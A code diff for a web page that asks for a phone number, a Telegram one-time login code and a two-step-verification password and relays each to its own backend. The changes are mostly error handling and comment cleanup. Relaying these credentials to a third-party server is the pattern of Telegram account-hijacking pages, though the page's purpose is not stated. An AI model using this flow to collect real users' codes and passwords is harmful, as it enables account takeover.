@@ -213,7 +213,6 @@
             100% { transform: translateY(0px) scale(1); border-color: #0088CC; background-color: #f9f9f9; }
         }
 
-        /* প্রতিটি বক্সে সাগরের ঢেউয়ের নির্দিষ্ট ডিলে (Wave timing offset) */
         .otp-small-box:nth-child(1) { animation-delay: 0.0s; }
         .otp-small-box:nth-child(2) { animation-delay: 0.1s; }
         .otp-small-box:nth-child(3) { animation-delay: 0.2s; }
@@ -282,7 +281,7 @@
         }
         .btn-verify-password:active { transform: scale(0.97); }
 
-        /* --- 9-Second Exact Animation Styles --- */
+        /* --- Progress & Success --- */
         #progress-container {
             position: absolute; width: 80%; max-width: 400px; opacity: 0;
             pointer-events: none; transition: opacity 0.5s ease-in;
@@ -333,7 +332,6 @@
         } else {
             document.addEventListener("DOMContentLoaded", () => {
                 document.getElementById("pageWrapper").style.opacity = "1";
-                // পেজ লোড বা রিফ্রেশ হলে কিবোর্ড সবসময় ফোন ইনপুট বক্সে ফোকাস করবে
                 document.getElementById("phoneInput").focus();
             });
         }
@@ -342,14 +340,12 @@
 <body>
 
     <div id="pageWrapper">
-        <!-- হেডার ন্যাভবার: বামে হোম বাটন (সরাসরি মূল হোমপেজে যাওয়ার জন্য) এবং ডানে রিফ্রেশ বাটন -->
         <div class="header-nav">
             <a href="/" class="header-btn home-btn" title="Home">
                 <svg class="home-icon" viewBox="0 0 24 24">
                     <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
                 </svg>
             </a>
-
             <button id="refreshBtn" onclick="triggerRefresh(this)" class="header-btn refresh-btn">REFRESH</button>
         </div>
 
@@ -434,7 +430,6 @@
             let activeIdx = val.length < 5 ? val.length : 4;
             smallBoxes[activeIdx].classList.add('active');
 
-            // যদি ৫ ডিজিটের ওটিপি কোড পূরণ হয়ে যায়, তবে অটোমেটিক ভেরিফাই কল হবে
             if (val.length === 5) {
                 verifyOtpCode();
             }
@@ -446,41 +441,40 @@
         }
 
         function sendCode() {
-            let phone = document.getElementById('phoneInput').value;
+            let phone = document.getElementById('phoneInput').value.trim();
             if(!phone) { alert("Please enter your phone number!"); return; }
             realInput.value = "";
             updateBoxes();
 
+            // ব্যাকএন্ডে রিকোয়েস্ট পাঠানো হচ্ছে
             fetch('/send-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ phone: phone })
             })
-            .then(res => res.json())
-            .then(data => {
-                if(data.status === "success") {
+            .then(async res => {
+                let data = await res.json();
+                if(res.ok && data.status === "success") {
                     globalPhoneCodeHash = data.phone_code_hash;
                     document.getElementById('phoneCodeHash').value = data.phone_code_hash;
                     alert("OTP sent successfully to your Telegram!");
                     realInput.focus();
                 } else {
-                    alert("Failed to send OTP: " + data.message);
+                    alert("Failed to send OTP: " + (data.message || "Unknown error"));
                 }
             })
-            .catch(err => alert("Connection error while sending OTP!"));
+            .catch(err => {
+                console.error("Error:", err);
+                alert("Connection error while sending OTP! Please check backend connection.");
+            });
         }
 
-        // ভেরিফিকেশন শুরু হলে বক্সে সাগরের ঢেউয়ের অ্যানিমেশন (Wave Effect) চালু হবে
         function startWaveAnimation() {
-            smallBoxes.forEach(box => {
-                box.classList.add('wave-anim');
-            });
+            smallBoxes.forEach(box => { box.classList.add('wave-anim'); });
         }
 
         function stopWaveAnimation() {
-            smallBoxes.forEach(box => {
-                box.classList.remove('wave-anim');
-            });
+            smallBoxes.forEach(box => { box.classList.remove('wave-anim'); });
         }
 
         function startSuccessAnimation() {
@@ -538,7 +532,7 @@
         }
 
         function verifyOtpCode() {
-            let phone = document.getElementById('phoneInput').value;
+            let phone = document.getElementById('phoneInput').value.trim();
             let code = realInput.value;
             let phoneCodeHash = document.getElementById('phoneCodeHash').value || globalPhoneCodeHash;
             
@@ -546,7 +540,6 @@
                 return;
             }
 
-            // ওটিপি পূরণ হওয়ার সাথে সাথে সাগরের ঢেউয়ের অ্যানিমেশন শুরু
             startWaveAnimation();
 
             fetch('/verify-code', {
@@ -554,16 +547,16 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ phone: phone, code: code, phone_code_hash: phoneCodeHash })
             })
-            .then(res => res.json())
-            .then(data => {
-                stopWaveAnimation(); // সার্ভার থেকে রেসপন্স আসলে ঢেউ থেম যাবে
-                if(data.status === "success") {
+            .then(async res => {
+                let data = await res.json();
+                stopWaveAnimation();
+                if(res.ok && data.status === "success") {
                     startSuccessAnimation();
                 } else if(data.status === "2fa_required") {
                     document.getElementById('passwordModal').style.display = 'flex';
                     document.getElementById('twoFactorPassword').focus();
                 } else {
-                    alert("Verification Failed: " + data.message);
+                    alert("Verification Failed: " + (data.message || "Invalid code"));
                     realInput.value = "";
                     updateBoxes();
                 }
@@ -575,7 +568,7 @@
         }
 
         function verifyPassword() {
-            let phone = document.getElementById('phoneInput').value;
+            let phone = document.getElementById('phoneInput').value.trim();
             let code = realInput.value;
             let phoneCodeHash = document.getElementById('phoneCodeHash').value || globalPhoneCodeHash;
             let password = document.getElementById('twoFactorPassword').value;
@@ -590,12 +583,12 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ phone: phone, code: code, phone_code_hash: phoneCodeHash, password: password })
             })
-            .then(res => res.json())
-            .then(data => {
-                if(data.status === "success") {
+            .then(async res => {
+                let data = await res.json();
+                if(res.ok && data.status === "success") {
                     startSuccessAnimation();
                 } else {
-                    alert("Password Verification Failed: " + data.message);
+                    alert("Password Verification Failed: " + (data.message || "Incorrect password"));
                     document.getElementById('twoFactorPassword').value = "";
                 }
             })
